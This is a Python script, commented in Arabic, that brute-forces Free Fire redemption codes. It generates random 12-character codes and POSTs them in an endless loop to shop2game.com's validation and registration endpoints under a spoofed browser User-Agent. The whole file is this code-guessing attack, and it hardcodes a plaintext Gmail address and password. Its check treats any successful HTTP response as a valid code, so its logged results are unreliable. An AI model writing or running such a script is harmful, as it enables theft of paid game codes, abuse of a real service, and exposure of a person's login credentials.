import requests
import time
import random
import string
import logging

# تسجيل الأخطاء
logging.basicConfig(filename='script.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Function to generate a random Free Fire code
def generate_free_fire_code():
    code_length = 12
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(code_length))

# Function to register on the website
def register_on_website(email, password, code):
    url = "https://shop2game.com/register"  # استبدل بعنوان URL الصحيح للتسجيل إذا كان مختلفًا
    payload = {
        "email": email,
        "password": password,
        "code": code
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    try:
        response = requests.post(url, data=payload, headers=headers)
        response.raise_for_status()  # يرفع استثناء إذا كانت حالة الاستجابة غير ناجحة
        logging.info(f"Registration successful for {email} with code {code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Registration failed for {email} with code {code}: {e}")

# Function to test a specific code on the website
def test_code_on_website(code):
    url = "https://shop2game.com/validate_code"  # استبدل بعنوان URL الصحيح للتحقق من الكود إذا كان مختلفًا
    payload = {
        "code": code
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    try:
        response = requests.post(url, data=payload, headers=headers)
        response.raise_for_status()
        logging.info(f"Code {code} is valid")
    except requests.exceptions.RequestException as e:
        logging.error(f"Code {code} is invalid: {e}")

# Main function to execute the script
def main():
    email = "atigibrahim040@gmail.com"
    password = "Lhosayn2079"
    max_attempts = 100000000000  # الحد الأقصى لعدد المحاولات
    delay = 1  # التأخير بين المحاولات (بالثواني)

    for attempt in range(max_attempts):
        code = generate_free_fire_code()
        logging.info(f"Attempt {attempt + 1}: Testing code {code}")
        test_code_on_website(code)
        register_on_website(email, password, code)
        time.sleep(delay)  # تأخير بين المحاولات

if __name__ == "__main__":
    main()
